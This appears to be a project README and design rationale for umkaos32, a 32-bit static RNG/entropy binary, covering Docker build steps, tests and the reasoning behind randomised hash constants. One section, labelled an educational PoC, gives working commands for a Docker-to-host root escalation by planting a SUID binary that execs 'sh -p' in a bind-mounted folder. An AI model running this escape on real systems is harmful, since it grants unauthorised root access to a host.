## umkaos32

**`(c)`** 2026 – Roberto A. Foglietta &lt;roberto.foglietta@gmail.com&gt;, CC BY-NC-ND 4.0

- &nbsp;Click on the button to know how to &nbsp;[![Sponsor me](https://img.shields.io/badge/Sponsor-%E2%9D%A4-ff69b4?style=flat&logo=github)](https://github.com/sponsors/robang74)&nbsp; this project and get in touch with me.

This document is a design rationale. It explains the architectural transition from uchaos/uckaos to umkaos and why randomized comb-based mixing supersedes fixed-constant whitening hashes in the uChaos paradigm. It also contains a container SUID shell exfiltration for root local escalation for the sake of education.

---

### Introduction

The umkaos32 is a userland binary built for supporting all the x86 CPUs from i386 and above. Compared with the same code compiled for AVX2 x64 which has a throughput of 600MB/s, the 32bit loses less than half of the performance and provides 67% throughput (400 MB/s). Because it is compiled as static musl can elf thus it runs on every system without extra libraries and when compressed with the self-extracting `gzcmd.sh` format takes less than 20Kb.

Like uchaos and uckaos (80MB/s), it provides entropy conduction without the need of a seed but it also avoid to use every fixed multiplicative constant to be hard to detect by the the CPU microcode. Instead, it uses a 64bit comb words stored in a 76 bytes table in a way the purposely misaligned 8bit reading increasing the jittering within the hot loop.

It creates its own table randomly shuffling the values at each run, thus it self-prepare a different .h at each building. Here below this step isn't reported but it is as simple as:

- `./umkaos > uchaos_tbl.h`

This strongly increases the difficulty of being detected at running time and thus targeted for being poisoned. While the SW virtualised CPU jittering might lack of real entropy in software virtual machines, and the scheduler jittering might be not totally trustable, the misaligned RAM readings, supplies even when KVM passthrough isn't enabled.

Moreover, because it does not need any particular privilege, every user can run it. Because its output is designed to be consumed by piping it, every application can `popen()` as an external independent executable without even the burden of integrating its GPLv2 code.

- download the pre-compiled self-extracting 32bit static binary from [here](https://raw.githubusercontent.com/robang74/working-in-progress/refs/heads/main/uchaosys.qemu/umkaos32.uzp)

Like uchaos and uckaos, aslo umkaos provides white-noise RNG which passed the 256GB PractRand test without flaw. Like every stochastic noise, sometimes it shows a 1E-3 event (unusual) and rarely a 2nd order event 1E-6 (mildly) but within the first 256GB, while a 3rd order event didn't seen yet. Such events are statistically probable thus their frequencies, the significant trait is their distribution is discrete by 1E-3 circa as 1st order.

Finally, the umkaos was designed to be as 32-bit friendly as possible (the throughput ratio prove it) despite being written with a 64-bit notation for 64-bit performance, clarity and shortness (the whole C-language code length is about 300 lines by an average of 40 chars each).

The aggressive inlining policy combined with a 32-bit algorithm design, allows the compiler to avoid using the few 32-bit coupled registers (`EDX:EAX`, `ECX:EBX`) and "leaving them uncongested, because the inner core's live set requires only two pairs for the 64-bit condenser and timing accumulator, while all other variables are pure 32-bit scalars".

The 32-bit binary shows a drop in performance which is just a fraction (`-33%`) even less the bare minimum half (`-50%`). While an order of magnitude would be expected for a full 64-bit cryptographic code, instead.

<br>

### Preparing the container for building

```sh
# After the preparation:
docker run -it i386/alpine:latest /bin/sh
# Inside the container:
apk update
apk add build-base musl-dev
exit

# get the container id with
docker ps -a | grep i386/alpine:latest

# after grabbed the container id
docker commit $cont-id alpine-i386-dev
docker rename $cont-id alpine-i386-dev

devc="-u $(id -u):$(id -g) -v .:/src -w /src alpine-i386-dev"
export devc
```

---

### The SUID escapes from the container

> [!WARNING]
> This container escape exploit is provided as PoC only for educational purposes and as a warning to pay attention to correct permissions and privileges management when using containers to compile your own stuff. Moreover, there isn't any grant that option `-p` is supported by every shell or system allowing a local privileges escalation without asking the password.

```sh
devc="-u 0:$(id -g) -v .:/src -w /src alpine-i386-dev"
docker run -it --rm $devc /bin/sh
```

Inside the container:

```sh
umask 0012
cat << 'EOF' > .iamroot.c
#include <stdio.h>
#include <unistd.h>
int main() {
    printf("Hello from 32-bit musl!\n");
    execl("/bin/sh", "sh", "-p", NULL);
    return 0;
}
EOF
gcc -o .iamroot .iamroot.c -s -static
size .iamroot; file .iamroot
chmod ug+wxs .iamroot
ls -al .iamroot
exit
```

Inside the host:

- `./.iamroot`

Inside the shell:

- `whoami`

After the exit:

- `rm -f .iamroot`

---

### 32-bit musl-static for i386 platform

Commands to execute in `uchaosys/kdev` folder:

```sh
biname="umkaos32"

CFLAGS="-s -O1 -Wno-format-extra-args -I../usrl -D_USE_FNCS"
CFLAGS="$CFLAGS -flto -falign-functions=32 -g0 -D_RNG_ONLY"
CFLAGS="$CFLAGS -ffunction-sections -fdata-sections -Wl,--gc-sections"

CFLAGS32="-m32 -march=i486 -mtune=generic -mno-avx -mno-sse"
CFLAGS32="$CFLAGS32 -mno-sse2 -mno-sse3 -mno-avx2 -fno-ident"
CFLAGS32="$CFLAGS32 -Qn -Wl,--build-id=none -static"

strp() {
  strip --strip-all --remove-section=.comment --remove-section=.note $@
}

devc="-u $(id -u):$(id -g) -v .:/src -w /src alpine-i386-dev"
docker run --rm $devc /bin/sh -c "cc $CFLAGS -D_USE_MLTP \
  $CFLAGS32 umkaos.c -no-pie -o $biname && chown 1000:1000 $biname"
```

Basic tests:

```sh
echo "Are there i386 unsupported instructions?"
objdump -d $biname | grep -E 'vmov|vadd|vpxor' || echo "NO"
echo "Are there plain-sight text strings?"
strings $biname | grep robang74 || echo "NO"
echo
file $biname | sed -e "s/386,/&\\n/"
strp $biname
size $biname
./umkaos32
```

Expected results:

```
Are there i386 unsupported instructions?
NO
Are there plain-sight text strings?
NO

umkaos32: ELF 32-bit LSB executable, Intel 80386,
 version 1 (SYSV), statically linked, stripped
   text	   data	    bss	    dec	    hex	filename
   5623	    320	    428	   6371	   18e3	umkaos32

/*
 * (C) 2026, github::@robang74, GPLv2
 */
//> Executing uChaoSys::umkaos v0.4.2
//> Use w/arg N for 2^N bytes dataout
```

To build many variants:

```
cd kdev
sh alt/umk_cmpl.sh
sh alt/umk_cmpl.sh tarball
sh alt/umk_cmpl.sh clean
```

<br>

### Rationale about umkaos

The original math problem was impossible to solve, unless attacked piece by piece, which is a quite wrong/uncommon approach for a theoretical serious study but it fits great when coding procedures (practical implementation) is an essential part of the problem solution.

1. murmur3 is fast but vulnerable because constant are constant

2. constants are vulnerable because they are well known in advance

3. not all the multipliers are equal and each creates N-dimension space

4. bits alternation isn't enough by itself but Fourier combs are descents

5. descents is not enough, unless enough lasts so little that its is fine

6. stochastics input aren't enough for a RNG, whitening is a need

7. whitening is a fragile step because can create structures

At this points few fact arises as prominent:

- fixing every single part of the problem creates another issue

- all the issues are a circular chain which can have a solution or not

Finding a solution means connecting the #7 with #1 in a way that all the intermediate points are automatically solved as issues. By the opposite, an attacker should find a weak link into this chain loop. When it comes to debunking the model aka analytical attack.

No one can calculate the collisions of a hash function (in this case, murmur3) if the choice of the constant (selected at random from 64 constants with equivalent characteristics) used to multiply the function itself depends on the stochastic state at the moment it is called.

And the stochastic condition does not depend on time in nanoseconds but on a stochastic transformation of it and its mixing with what is effectively a 64-bit entropy capacitor in which the contribution of previous states loses weight, as happens in an electrical capacitor, in favour of the most recently mixed inputs.

By framing the entropy pool as an electrical capacitor, it introduces a concept known in advanced signal processing and cryptography as a leaky integrator or a state with exponential decay. This completely redefines how the system handles state compromise and collision resistance.

The original math problem was indeed an impossible problem to solve. And I did not solve it. In fact. I have reframed it for my own purpose. And suddenly it isn't anymore about guessing which will be the next state/output, but which will be the next generative model to break, breakable in some rounds but not in a single one or a few. And by the time that specific model will return, the internal state will be totally different and uncorrelated with the previous N steps before.

For example, this murmur3 isn't better than the original one, but it changes. And it *gaslights* those trying to approach it by the traditional way in which static means continuity, and continuity means reducible, and reducing it breaks it. Continuity is weak (capacitor) and the reduction requires too many rounds compared to the return period of the **model**.

<br>

### Ratione peer-review by Kimi

The description is sound but not fully clear to an audience that has not followed your entire development history. It reads like a notebook entry for insiders rather than an explanation.

In this context, "gaslighting" means self-induced modeling error caused by projecting continuity onto a non-stationary chaotic system. Read it as "the attacker self-deceives by assuming stationarity", and the text becomes accessible to a broader technical audience.

The circular chain framing (1→7→1) is methodologically honest: not claiming to have solved an impossible math problem but to have reframed it so that the impossibility works in favor rather than be a weakness. This is a sophisticated epistemological move, and stating it explicitly reveals awareness about it.

The "model return period" concept is the key innovation. Traditional cryptanalysis assumes algorithmic continuity: if the hash is Murmur3 with a fixed known multiplicative constant, the adversary can pre-compute hyperplanes accumulations, collisions, differentials, or bias patterns.

By making the effective hash function change the multiplicative factor every cycle based on stochastic state, it forces the adversary from offline pre-computation to online adaptive attack. This is a valid and significant shift in the threat model.

Finally, the capacitor/condenser analogy is the physical intuition that makes the non-stationarity concrete. The condenser is what transforms the circular chain from a vicious cycle into a virtuous loop and loop closes because the "memory" of past states progressively fades, making the system self-healing against analytical reduction.


